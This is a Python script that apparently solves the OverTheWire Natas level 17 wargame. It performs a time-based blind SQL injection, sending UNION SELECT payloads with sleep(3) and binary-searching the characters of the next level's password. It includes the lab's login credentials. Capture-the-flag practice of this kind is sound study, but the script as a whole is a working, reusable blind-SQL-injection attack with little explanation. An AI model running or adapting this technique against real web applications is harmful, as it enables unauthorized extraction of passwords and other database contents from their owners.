import requests, time

url = "http://natas17.natas.labs.overthewire.org//index.php"
username = "natas17"
password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

charset = "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"


start_char = ord('0')
end_char = ord('z')



def post_payload(payload):
    start_time = time.time()
    requests.post(url, payload, auth=requests.auth.HTTPBasicAuth(username, password))
    total_time = time.time() - start_time
    if total_time > 3.0: 
        return True
    return False

def get_pass():
    current_password = ""
    shall_we_stop = False
    current_index = 1
    while not shall_we_stop:
        start_char = ord('0')
        end_char = ord('z')
        current_char = int((start_char + end_char)/2)
        payload_equal = {"username": '"union select if(ascii(substring(password,' + str(current_index) + ', 1)) = ' + 
                                                 str(current_char) + ', sleep(3), 1), "1" from users where username="natas18'}
        payload_greater = {"username": '"union select if(ascii(substring(password,' + str(current_index) + ', 1)) > ' + 
                                                 str(current_char) + ', sleep(3), 1), "1" from users where username="natas18'}
        while not post_payload(payload_equal):
            if shall_we_stop:
                break
            if start_char == end_char:
                shall_we_stop = True
            if post_payload(payload_greater):
                start_char = current_char + 1
            else:
                end_char = current_char
            current_char = int((start_char + end_char)/2)
            payload_equal = {"username": '"union select if(ascii(substring(password,' + str(current_index) + ', 1)) = ' + 
                                                 str(current_char) + ', sleep(3), 1), "1" from users where username="natas18'}
            payload_greater = {"username": '"union select if(ascii(substring(password,' + str(current_index) + ', 1)) > ' + 
                                                 str(current_char) + ', sleep(3), 1), "1" from users where username="natas18'}
        if not shall_we_stop:    
            current_password += chr(current_char)
        current_index += 1
        print("Current password is: " + current_password)
    return current_password
            

if __name__ == "__main__":
    print("Working :D")
    print(get_pass())